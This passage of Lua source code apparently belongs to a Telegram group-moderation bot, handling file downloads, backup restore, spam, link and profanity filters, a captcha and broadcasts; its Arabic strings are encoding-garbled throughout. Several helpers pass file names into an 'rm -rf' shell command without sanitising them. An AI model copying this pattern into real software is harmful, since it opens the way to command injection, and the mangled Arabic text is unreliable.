message = 'Ψ±Ψ¨ Ψ§ΩΨͺΩΨ§ΨΉΩ' 
end 
return message 
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_,msg.id_,'./'..File_Name,'ΨͺΩ ΨͺΨ­ΩΩΩ Ψ§ΩΩΩΨ΅Ω Ψ§ΩΩ Ψ΅ΩΨ±Ω') 
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_,msg.id_, './'..ty) 
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"REVOR") 
os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_,msg.id_, './'..rre)
os.execute('rm -rf ./'..rre) 
end
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
sendtext(chat,msg.id_,"Ω­ ΩΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨ§Ψ­ΨͺΩΨ§Ψ·ΩΩ ΩΩΨ³ ΩΩΨ§Ψ°Ψ§ Ψ§ΩΨ¨ΩΨͺ")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_,"Ω­ Ψ¬Ψ§Ψ±Ω ...\nΩ­ Ψ±ΩΨΉ Ψ§ΩΩΩΩ Ψ§ΩΨ§Ω") 
else
sendtext(chat,msg.id_,"*Ω­ ΨΉΨ°Ψ±Ψ§ Ψ§ΩΩΩΩ ΩΩΨ³ Ψ¨Ψ΅ΩΨΊΨ© {JSON} ΩΨ±Ψ¬Ω Ψ±ΩΨΉ Ψ§ΩΩΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­*")    
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
vardump(groups)  
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg) 
database:sadd(bot_id..'UsersBot',idg)
database:set(bot_id.."Lock:tagservrbot"..idg,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..''..lock..idg,"del") 
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id.."Creator"..idg,idmsh)
end;end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id.."Manager"..idg,idmder)  
end;end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id.."Mod:User"..idg,idmod)  
end;end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id.."Basic:Creator"..idg,idASAS)  
end;end
if v.linkgroup then
if v.linkgroup ~= "" then
database:set(bot_id.."Private:Group:Link"..idg,v.linkgroup)   
end;end;end
for idu,v in pairs(groups.GP_BOT.mem) do
database:sadd(bot_id..'UsersBot',idu) 
end
send(chat,msg.id_,"Ω­ ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΩΩΩ Ψ¨ΩΨ¬Ψ§Ψ­ ΩΨͺΩΨΉΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ\nΩ­ ΩΨ±ΩΨΉ {Ψ§ΩΨ§ΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ ; ΩΨ§ΩΩΩΨ΄Ψ¦ΩΩ ; ΩΨ§ΩΩΨ―Ψ±Ψ§Ψ‘; ΩΨ§ΩΨ§Ψ―ΩΩΩΩ} Ψ¨ΩΨ¬Ψ§Ψ­") 
end
function Is_Not_Spam(msg,type)
if type == "kick" then 
Reply_Status(msg,msg.sender_user_id_,"reply","Ω­ ΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± ΩΩΨ§ ΩΨͺΩ Ψ·Ψ±Ψ―Ω") 
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
return false 
end 
if type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end 
if type == "keed" then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_) 
Reply_Status(msg,msg.sender_user_id_,"reply","Ω­ ΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± ΩΩΨ§ ΩΨͺΩ ΨͺΩΩΩΨ―Ω") 
return false 
end 
if type == "mute" then
Reply_Status(msg,msg.sender_user_id_,"reply","Ω­ ΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± ΩΩΨ§ ΩΨͺΩ ΩΨͺΩΩ") 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_) 
return false 
end
end 
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end return chat end
function Tshake_Files(msg)
for v in io.popen('ls Tshake_Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Tshake_Files/"..v)
if plugin.Tshake and msg then
pre_msg = plugin.Tshake(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg) 
end
function Tshake_Started_Bot(msg,data) -- Ψ¨Ψ―Ψ§ΩΨ© Ψ§ΩΨΉΩΩ
if msg then
local msg = data.message_
local text = msg.content_.text_
if msg.sender_user_id_ == tonumber(bot_id) then return false end
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'messageUser'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'UsersBot',msg.sender_user_id_) 
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end

if text and text:match("@[%a%d_]+") and DevSonic(msg) and database:get(bot_id..":usernewsudo:"..msg.sender_user_id_) then 
function Function_Tshake(arg, data)
msg = arg.msg
if data.id_ then
if (data and data.type_ and data.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end
idmsgq = database:get(bot_id..":usernewsudo:"..msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = idmsgq}) 
local Tshake_Info_Sudo = io.open("sudo.lua", 'w')
Tshake_Info_Sudo:write([[
token = "]]..token..[["

Sudo = ]]..data.id_..[[ 

UserName = "]]..msg.content_.text_..[[" ;
]])
Tshake_Info_Sudo:close()
send(msg.chat_id_,msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ¨ΩΨͺ Ψ¨ΩΨ¬Ψ§Ψ­ .")
database:del(bot_id..":usernewsudo:"..msg.sender_user_id_)
dofile('Tshake.lua') 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},Function_Tshake,{msg=msg})



return false
end

if text == "ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω" and DevSonic(msg) then 
local Text = "Ω­ Ψ³ΩΩ ΩΨͺΩ ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω\nβοΈ βΩΩ Ψ§ΩΨͺ ΩΨͺΨ£ΩΨ― ΩΩ ΩΨ°Ψ§ Ψ§ΩΨͺΨΊΩΨ± Ψ"
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'ΩΨΉΩ', callback_data=msg.sender_user_id_.."/yesS"},{text = 'ΩΩΨ§ , Ψ§ΩΨΊΨ§Ψ‘', callback_data=msg.sender_user_id_.."/noS"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]") 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ¬ΩΩΨΉΩ ") 
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
-------by-dev-7oda 
if database:get(bot_id.."CAPTCHA"..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
captcha = math.random(4567,8907);
cap = math.random(10,50);
capt = math.random(60,90);
capc = math.random(100,500);
local Text ='β’ ΩΩ Ψ¨Ψ?ΨͺΩΨ§Ψ± Ψ§ΩΨ±ΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­ Ψ§ΩΩΩΨ¬ΩΨ― ΩΩ Ψ§ΩΨ΅ΩΨ±Ω\nβ’ ΩΩΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―Ω Ψ§ΩΨ§Ω'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '9'..capt..'5', callback_data=capt..msg.sender_user_id_},{text =capc..'2', callback_data=capc..msg.sender_user_id_}},
{{text = '4'..cap..'8', callback_data=cap},{text = captcha, callback_data='okCaptcha'..msg.sender_user_id_}},
{{text = '1'..capt..'2', callback_data=capt},{text = '7'..capc, callback_data=capc}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://vvvzvv.ml/amir00/captcha.php?c='..captcha..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end 
if msg.sender_user_id_ and Muted_Groups(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
----------------
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or "nil"
Num_Msg_Max = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
Time_Spam = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id.."floodc:"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
Is_Not_Spam(msg,type) 
end
database:setex(bot_id.."floodc:"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or "nil" 
Num_Msg_Max = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
Num_Msg_Max = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
Time_Spam = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Lock:text"..msg.chat_id_) and not Special(msg) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false 
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id.."Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then 
if database:get(bot_id.."Lock:AddMempar"..msg.chat_id_) == "kick" then
local mem_id = msg.content_.members_ 
for i=0,#mem_id do 
Kick_Group(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."Lock:Join"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
return false 
end
end
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Admin(msg) then 
list = {"ΩΨ³","ΩΨ³ΩΩ","ΩΨ³Ψ?ΨͺΩ","ΨΉΩΨ±","ΩΨ³Ψ?Ψ§ΩΨͺΩ","Ψ?Ψ±Ψ§ Ψ¨Ψ§ΩΩΩ","ΨΉΩΨ± Ψ¨Ψ§ΩΩΩ","ΩΨ³Ψ?ΩΨ§ΨͺΩΩ","ΩΨ­Ψ§Ψ¨","ΩΩΨ§ΩΩΨ¬","ΩΩΨ§ΩΩΨ¬","ΩΨ­Ψ¨Ω","Ψ§Ψ¨Ω Ψ§ΩΩΨ­Ψ¨Ω","ΩΨ±Ψ?","ΩΨ±ΩΨ?","Ψ·ΩΨ²Ω","Ψ·ΩΨ²Ψ?ΨͺΩ"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Admin(msg) then 
list = {"Ϊ©Ω","ΩΎΫ","Ψ?Ψ³ΨͺΩ","Ψ¨Ψ±Ω","Ψ±Ψ§Ψ­ΨͺΫ","Ψ¨ΫΨ§Ω","Ψ¨ΩΎΩΨ΄Ω","ΩΨ±ΩΩ","ΪΩ","Ϊ¬","ΪΏ","Ϊ","Ϊ","Ϊ","Ϊ","έ","ΪΈ","ΩΎ","Ϋ΄","Ψ²Ψ―Ω","Ψ―Ψ?ΨͺΨ±Ψ§","Ψ―ΫΩΨ«","ΩΪ©","Ψ²Ψ―Ω"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if msg.content_.ID == 'MessageSticker' and not Manger(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " *Ω­ΨΉΨ°Ψ±Ψ§ β«* {[@"..data.username_.."]}\n*Ω­ΨΉΨ°Ψ±Ψ§ ΨͺΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅Ω* \n" ) 
else
send(msg.chat_id_,0, " *Ω­ΨΉΨ°Ψ±Ψ§ β«* {["..data.first_name_.."](T.ME/Revorb0t)}\n*Ω­ΨΉΨ°Ψ±Ψ§ ΨͺΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅Ω* \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
if msg.content_.ID == 'MessagePhoto' and not Manger(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.sizes_[1].photo_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," Ω­ΨΉΨ°Ψ±Ψ§ β« {[@"..data.username_.."]}\n Ω­ΨΉΨ°Ψ±Ψ§ ΨͺΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±Ω \n" ) 
else
send(msg.chat_id_,0," Ω­ΨΉΨ°Ψ±Ψ§ β« {["..data.first_name_.."](T.ME/Revorb0t)}\n Ω­ΨΉΨ°Ψ±Ψ§ ΨͺΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±Ω \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------ Ψ§ΩΩΩΩΨ± Ψ§ΩΩΨ―ΩΩΩΩΩ
if msg.content_.ID == 'MessageAnimation' and not Manger(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," *Ω­ΨΉΨ°Ψ±Ψ§ β«* {[@"..data.username_.."]}\n*Ω­ΨΉΨ°Ψ±Ψ§ ΨͺΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ* \n") 
else
send(msg.chat_id_,0," *Ω­ΨΉΨ°Ψ±Ψ§ β«* {["..data.first_name_.."](T.ME/Revorb0t)}\n*Ω­ΨΉΨ°Ψ±Ψ§ ΨͺΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ* \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then 
if database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "del" and not Special(msg) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "ked" and not Special(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "kick" and not Special(msg) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "ktm" and not Special(msg) then 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then 
if database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "del" and not Special(msg) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "ked" and not Special(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "kick" and not Special(msg) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "ktm" and not Special(msg) then 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then 
if database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Special(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."Lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Special(msg) then
if database:get(bot_id.."Lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
